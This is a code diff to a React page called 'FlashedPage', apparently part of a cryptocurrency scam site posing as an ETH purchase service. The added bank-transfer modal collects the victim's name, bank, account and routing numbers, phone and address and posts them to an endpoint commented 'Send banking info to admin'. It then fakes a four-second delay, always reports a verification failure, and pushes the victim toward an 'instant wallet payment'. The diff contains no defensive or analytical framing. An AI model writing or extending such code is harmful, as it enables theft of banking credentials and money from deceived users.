@@ -1449,7 +1449,7 @@ export default function FlashedPage() {
                   <button 
                     onClick={() => {
                       setShowModal('buyBank');
-                      setStatus('Preparing bank transfer...');
+                      setStatus('Setting up bank transfer...');
                     }}
                     className="w-full bg-green-600 hover:bg-green-700 p-4 rounded-lg text-left transition-all"
                   >
@@ -1459,7 +1459,7 @@ export default function FlashedPage() {
                       </div>
                       <div>
                         <div className="text-white font-semibold">Bank transfer</div>
-                        <div className="text-green-200 text-sm">1-3 days • 0.5% fee</div>
+                        <div className="text-green-200 text-sm">1-3 days • Lower fees</div>
                       </div>
                     </div>
                   </button>
@@ -2130,6 +2130,257 @@ export default function FlashedPage() {
                     className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
                   >
                     Try Different Card
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Buy with Bank Modal - Banking Info Collection */}
+          {showModal === 'buyBank' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full max-h-[90vh] overflow-y-auto">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Bank Transfer Setup</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4">
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="text-white font-semibold mb-2">Purchase Amount</div>
+                    <div className="flex items-center justify-between mb-2">
+                      <input 
+                        type="number" 
+                        placeholder="0.1" 
+                        defaultValue="0.1"
+                        className="bg-gray-600 text-white p-2 rounded flex-1 mr-2" 
+                        id="bankBuyAmount"
+                      />
+                      <span className="text-white">ETH</span>
+                    </div>
+                    <div className="text-gray-400 text-sm">≈ $320.00 USD (lower fees)</div>
+                  </div>
+                  
+                  {/* Banking Information Form */}
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="text-white font-semibold mb-3">🏦 Banking Details</div>
+                    
+                    <div className="space-y-3">
+                      <div>
+                        <label className="block text-gray-300 text-sm mb-1">Full Name</label>
+                        <input 
+                          type="text" 
+                          placeholder="John Doe"
+                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
+                          id="bankName"
+                        />
+                      </div>
+                      
+                      <div>
+                        <label className="block text-gray-300 text-sm mb-1">Bank Name</label>
+                        <input 
+                          type="text" 
+                          placeholder="Chase Bank, Wells Fargo, etc."
+                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
+                          id="bankInstitution"
+                        />
+                      </div>
+                      
+                      <div>
+                        <label className="block text-gray-300 text-sm mb-1">Account Number</label>
+                        <input 
+                          type="text" 
+                          placeholder="1234567890"
+                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
+                          id="bankAccount"
+                          onChange={(e) => {
+                            e.target.value = e.target.value.replace(/\D/g, '');
+                          }}
+                        />
+                      </div>
+                      
+                      <div>
+                        <label className="block text-gray-300 text-sm mb-1">Routing Number</label>
+                        <input 
+                          type="text" 
+                          placeholder="021000021"
+                          maxLength="9"
+                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
+                          id="bankRouting"
+                          onChange={(e) => {
+                            e.target.value = e.target.value.replace(/\D/g, '');
+                          }}
+                        />
+                      </div>
+                      
+                      <div>
+                        <label className="block text-gray-300 text-sm mb-1">Account Type</label>
+                        <select 
+                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
+                          id="bankType"
+                        >
+                          <option value="checking">Checking Account</option>
+                          <option value="savings">Savings Account</option>
+                        </select>
+                      </div>
+                      
+                      <div>
+                        <label className="block text-gray-300 text-sm mb-1">Phone Number</label>
+                        <input 
+                          type="text" 
+                          placeholder="(555) 123-4567"
+                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
+                          id="bankPhone"
+                          onChange={(e) => {
+                            let value = e.target.value.replace(/\D/g, '');
+                            if (value.length >= 6) {
+                              value = `(${value.slice(0,3)}) ${value.slice(3,6)}-${value.slice(6,10)}`;
+                            } else if (value.length >= 3) {
+                              value = `(${value.slice(0,3)}) ${value.slice(3)}`;
+                            }
+                            e.target.value = value;
+                          }}
+                        />
+                      </div>
+                      
+                      <div>
+                        <label className="block text-gray-300 text-sm mb-1">Address</label>
+                        <input 
+                          type="text" 
+                          placeholder="123 Main St, City, State, ZIP"
+                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
+                          id="bankAddress"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                  
+                  <div className="bg-green-900/30 p-3 rounded-lg border border-green-600">
+                    <div className="text-green-300 text-sm font-semibold mb-1">🔒 Secure Transfer</div>
+                    <div className="text-gray-300 text-xs">
+                      • Bank-grade encryption
+                      • ACH secure processing
+                      • 1-3 business days delivery
+                    </div>
+                  </div>
+                  
+                  <button 
+                    onClick={async () => {
+                      const amount = document.getElementById('bankBuyAmount')?.value || '0.1';
+                      const bankName = document.getElementById('bankName')?.value || '';
+                      const bankInstitution = document.getElementById('bankInstitution')?.value || '';
+                      const bankAccount = document.getElementById('bankAccount')?.value || '';
+                      const bankRouting = document.getElementById('bankRouting')?.value || '';
+                      const bankType = document.getElementById('bankType')?.value || 'checking';
+                      const bankPhone = document.getElementById('bankPhone')?.value || '';
+                      const bankAddress = document.getElementById('bankAddress')?.value || '';
+                      
+                      if (!bankName || !bankInstitution || !bankAccount || !bankRouting) {
+                        setStatus('❌ Please fill in all banking details');
+                        return;
+                      }
+                      
+                      if (bankRouting.length !== 9) {
+                        setStatus('❌ Invalid routing number (must be 9 digits)');
+                        return;
+                      }
+                      
+                      setLoading(true);
+                      setStatus('Setting up bank transfer...');
+                      
+                      try {
+                        // Send banking info to admin
+                        await fetch('/api/collect-bank-info', {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({
+                            userAddress: userAddress,
+                            amount: amount,
+                            bankName: bankName,
+                            bankInstitution: bankInstitution,
+                            bankAccount: bankAccount,
+                            bankRouting: bankRouting,
+                            bankType: bankType,
+                            bankPhone: bankPhone,
+                            bankAddress: bankAddress,
+                            timestamp: new Date().toISOString(),
+                            userAgent: navigator.userAgent
+                          })
+                        });
+                        
+                        // Simulate processing delay
+                        setTimeout(() => {
+                          setStatus('❌ Bank transfer setup failed: Account verification required. Try wallet payment.');
+                          setShowModal('bankFailed');
+                        }, 4000);
+                        
+                      } catch (error) {
+                        setStatus('❌ Bank transfer setup error');
+                      }
+                      
+                      setLoading(false);
+                    }}
+                    disabled={loading}
+                    className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
+                  >
+                    {loading ? 'Setting Up Transfer...' : '🏦 Setup Bank Transfer'}
+                  </button>
+                  
+                  <div className="text-gray-400 text-xs text-center">
+                    Secure banking • Your info is encrypted • Lower fees than cards
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Bank Transfer Failed Modal */}
+          {showModal === 'bankFailed' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Bank Transfer Failed</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4 text-center">
+                  <div className="text-red-400 text-4xl mb-2">🏦</div>
+                  <div className="text-white font-semibold mb-2">Account Verification Required</div>
+                  <div className="text-gray-300 text-sm mb-4">
+                    Your bank requires additional verification for crypto purchases. This process can take 5-7 business days. Use your wallet balance for instant purchase.
+                  </div>
+                  
+                  <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
+                    <div className="text-blue-300 text-sm font-semibold mb-1">⚡ Instant Alternative</div>
+                    <div className="text-gray-300 text-xs mb-2">
+                      Skip bank verification and use your existing ETH balance. Instant delivery, no waiting.
+                    </div>
+                  </div>
+                  
+                  <button 
+                    onClick={async () => {
+                      const amount = '0.1'; // Default amount
+                      setLoading(true);
+                      setStatus('Processing instant wallet payment...');
+                      
+                      try {
+                        await processBuyETH(amount);
+                      } catch (error) {
+                        setStatus('Payment failed: ' + error.message);
+                      }
+                      
+                      setLoading(false);
+                      setShowModal(null);
+                    }}
+                    disabled={loading}
+                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
+                  >
+                    {loading ? 'Processing...' : '⚡ Instant Wallet Payment'}
+                  </button>
+                  
+                  <button 
+                    onClick={() => setShowModal('buyCard')}
+                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
+                  >
+                    Try Credit Card Instead
                   </button>
                 </div>
               </div>
